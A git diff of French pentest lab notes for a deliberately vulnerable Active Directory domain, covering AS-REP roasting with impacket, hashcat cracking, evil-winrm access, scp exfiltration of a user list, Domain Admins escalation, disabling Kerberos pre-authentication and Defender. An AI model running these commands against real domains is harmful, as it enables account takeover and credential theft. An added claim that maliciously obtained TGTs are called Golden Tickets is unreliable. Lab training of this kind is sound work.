@@ -12,6 +12,10 @@
 
 <br>
 
+> [!IMPORTANT]
+> Lors d'un Audit ou d'un Pentest et quelque soit sa nature il faut penser à toujours documenter les informations récoltées au fur et à mesure afin d'éviter les oublis (en vue du rapport pour le client), mais également si des modifications sont apportées (créations d'utilisateurs, modification des droits pour éléver ses privilèges...) de pouvoir être capable de rendre les choses dans leur état initial. 
+
+<br>
 
 ## Mise en place de BadBlood
 
@@ -20,7 +24,7 @@ Afin de rendre l'Active Directory vulnérable le script **BadBlood** est utilis�
 
 Il est utilisé pour tester BloodHound, s’entraîner à l’attaque/défense AD et simuler des scénarios réels sans impacter un vrai environnement de production.
 
-[Lien vers la page GitHub du créateur de BadBlood](https://github.com/davidprowe/BadBlood)
+Lien vers la [page GitHub du créateur de BadBlood](https://github.com/davidprowe/BadBlood)
 
 
 <br>
@@ -63,7 +67,7 @@ sudo nmap -sV 10.0.0.1
 * Ping Castle permet de faire un état de santé général de l'Active Directory.
 * Cet outils est basé sur les critères de sécurités comme CIS Benchmarks, ANSSI
 * Il génère un rapport détallé en 4 blocs distincts.
-* [Lien vers le téléchargement de PingCastle](https://www.pingcastle.com/download/)
+* Lien vers le [téléchargement de PingCastle](https://www.pingcastle.com/download/)
 
 <br>
 
@@ -85,6 +89,7 @@ Un score est indiqué pour chacune des 4 parties, trust est à 0 car il n'y a pa
 
 <br>
 
+
 Dans la partie **Stale Objects** on retrouve une liste de comptes qui ne requièrent pas de pré-authentification Kerberos
 
 ![img](img/pc1.png)
@@ -95,6 +100,7 @@ On peut aussi voir un compte administrateur qui ne nécéssite pas de pré-authe
 
 ![img](img/ping1.png)
 
+<br>
 
 Vérifer les comptes qui ne nécéssitent pas de pré-authetification Kerberos
 ```powershell
@@ -110,21 +116,20 @@ Get-ADObject -LDAPFilter "(userAccountControl:1.2.840.113556.1.4.803:=4194304)"
 
 
 
+<br>
 
 <br>
 
 
 
-
-
 # **AS-REP Roasting** 
 
-Cette vulnérabilité consite à récupérer un ticket AS-REP
+Cette vulnérabilité consite à récupérer un ticket TGT
 
-* En productions les comptes de services ont déjà un mot de passe car ils sont utilisés tous les jours.
-* Certains programmes et applications ne supportent l'authentification LDAP si la préauthentification n'est pas désactivée sur le compte de service.
+* Les **Ticket Granting Tickets** sont fournis par le **Key Distribution Center** (KDC), mais obtenus de façon malicieuse on les appelle **Golden Tiket**.
+* Certains programmes et applications supportent l'authentification LDAP que si la préauthentification est désactivée sur le compte de service.
 * Si la pré-authentification est désactivée sur un compte, n'importe qui peut réclamer un ticket au nom de l'utilisateur.
-* Impacket permet de récupérer le message AS-REP (Authentication Service Response) avec le hash kerberos (etype 23 – RC4-HMAC).
+* Impacket permet de récupérer le message **AS-REP** (Authentication Service Response) d'un utilisateur avec le hash kerberos (etype 23 – RC4-HMAC).
 
 <br>
 
@@ -132,19 +137,15 @@ Cette vulnérabilité consite à récupérer un ticket AS-REP
 > * Créer un fichier avec les noms de connexion utilisateurs listés dans PinCastle (usr.txt ici). 
 > * Le mot de passe à été changé manuellement dans l'AD car le script BadBlood ne connecte pas automatiquement les comptes.
 
+<br>
 
 Avec Impacket :
 ```sh
 impacket-GetNPUsers tssr-cyber.fr/ -no-pass -usersfile usr.txt
 ```
 
-| Code d’erreur Kerberos            | Statut de l’utilisateur                                   |
-|----------------------------------|------------------------------------------------------------|
-| KDC_ERR_C_PRINCIPAL_UNKNOWN      | Le nom d’utilisateur n’existe pas                          |
-| KDC_ERR_PREAUTH_REQUIRED         | Le nom d’utilisateur est valide et le compte est activé    |
-| KDC_ERR_CLIENT_REVOKED           | L’utilisateur existe, mais le compte est désactivé ou bloqué |
-| KDC_ERR_KEY_EXPIRED              | Password expiré, changé le pswd pur reset   |
 
+<br>
 
 Cibler un seul compte
 ```sh
@@ -158,7 +159,14 @@ Ajouter le hash dans un fichier
 printf '%s\n' '$krb5asrep$23$COLETTE_MCKEE@TSSR-CYBER.FR:<hash>' > COLETTEHASH.txt 
 ```
 
+<br>
 
+| Code d’erreur Kerberos            | Statut de l’utilisateur                                   |
+|----------------------------------|------------------------------------------------------------|
+| KDC_ERR_C_PRINCIPAL_UNKNOWN      | Le nom d’utilisateur n’existe pas                          |
+| KDC_ERR_PREAUTH_REQUIRED         | Le nom d’utilisateur est valide et le compte est activé    |
+| KDC_ERR_CLIENT_REVOKED           | L’utilisateur existe, mais le compte est désactivé ou bloqué |
+| KDC_ERR_KEY_EXPIRED              | Password expiré, changé le pswd pur reset   |
 
 <br>
 
@@ -169,7 +177,7 @@ printf '%s\n' '$krb5asrep$23$COLETTE_MCKEE@TSSR-CYBER.FR:<hash>' > COLETTEHASH.t
 
 
 * Après avoir avoir récupéré un hash, le mettre dans un fichier et essayer de le craker avec hashcat ou JhonTheRipper
-* Le fichier asrep.hash contient le hash AS-REP obtenu avec impacket : `$krb5asrep$23$KATRINA_RUTLEDGE@CYBER-MANAGEMENT.FR:<hash>`
+* Créer un fichier (ici asrep.hash) qui contient le hash AS-REP obtenu avec impacket : `$krb5asrep$23$KATRINA_RUTLEDGE@CYBER-MANAGEMENT.FR:<hash>`
 
 ```sh
 sudo hashcat -m 18200 -a 0 asrep.hash /usr/share/wordlists/rockyou.txt
@@ -194,9 +202,9 @@ sudo hashcat -m 18200 -a 0 berniepatehash.txt /usr/share/wordlists/rockyou.txt -
 
 
 
-## __DUMP OBJETS LDAP__
+## __DUMPER LES OBJETS LDAP__
 
-Informations similaires à Ping Castle
+Les informations collectées sont similaires à Ping Castle, mais l'outils est rapide et peut toujours être utile lors d'un Audit AD.
 
 * ldapdomaindump
   * Dumper les utilisateurs AD
@@ -340,43 +348,43 @@ Chemin des logs Responder :
 
 ## __Se conencter via WinRM sur la machine victime__
 
-L'utilisateur doit être dans le groupe admin du domaine
+### L'utilisateur doit être dans le groupe admin du domaine
 ```sh
 sudo evil-winrm -i 10.0.0.1 -u '<UserName>@<Domain-Name>' -p '<password>'
 ```
 
 ![img](img/evil.png)
 
-Extraire une liste d'utilisateurs de l'AD
+### Extraire une liste d'utilisateurs de l'AD
 ```powershell
 Get-ADUser -Filter * | Select-Object -ExpandProperty SamAccountName | Out-File -Encoding UTF8 C:\Users\Administrateur\Desktop\domusers.txt
 ```
-Tranférer la liste du DC vers la Kali
+### Tranférer la liste du DC vers la Kali
 ```sh
 scp C:\Users\Administrateur\Desktop\domusers.txt totol@10.0.0.51:/home/toto/Bureau/
 ```
 
-Afficher les groupes contenant la string "admin"
+### Afficher les groupes contenant la string "admin"
 ```powershell
 Get-ADGroup -Filter 'Name -like "admin*"' | Select name
 ```
 
-Ajouter un utilisateur dans le groupe admin du domaine
+### Ajouter un utilisateur dans le groupe admin du domaine
 ```powershell
 Add-ADGroupMember -Identity "Admins du domaine" -Members "EDDIE_ROACH"
 ```
 
-Ajouter du flag DONT_REQ_PREAUTH (attribut userAccountControl) désactive la préauth kerberos
+### Ajouter du flag DONT_REQ_PREAUTH dans l'attribut userAccountControl (désactive la préauth kerberos)
 ```powershell
 Set-ADUser EDDIE_ROACH -Replace @{userAccountControl = ( (Get-ADUser EDDIE_ROACH -Properties userAccountControl).userAccountControl -bor 0x400000 )}
 ```
 
-Changer la password d'un utilisateur 
+### Changer la password d'un utilisateur 
 ```powershell
 Set-ADAccountPassword EDDIE_ROACH -Reset -NewPassword (ConvertTo-SecureString "Password123456" -AsPlainText -Force)
 ```
 
-Récupérer son ticket kerberos
+### Récupérer son ticket kerberos
 ```sh
 impacket-GetNPUsers TSSR-CYBER.FR/EDDIE_ROACH -no-pass
 ```
@@ -388,9 +396,7 @@ Evilwinrm permet aussi de se connecter avec un hash NTLM (Pass-the-Hash) et de c
 
 
 
-
 <br>
-
 
 
 
@@ -416,7 +422,7 @@ C'est est principalement un outils RedTeam, mais il peut aussi servir à compren
 
 ## Éxécuter SharpHound.exe
 
-Lancer l'exe sur une machine du domaine
+SharpHound se lance sur une machine du domaine, c'est lui qui se charge de récolter les informations du domaine qu'on exploitera par la suite.
 
 ### Désactiver Defender
 ```powershell
@@ -517,3 +523,6 @@ password : bloodhoundcommunityedition
 ```
 
 Aller dans Upload et charger le fichier "20260108151307_BloodHound.zip"
+
+
+
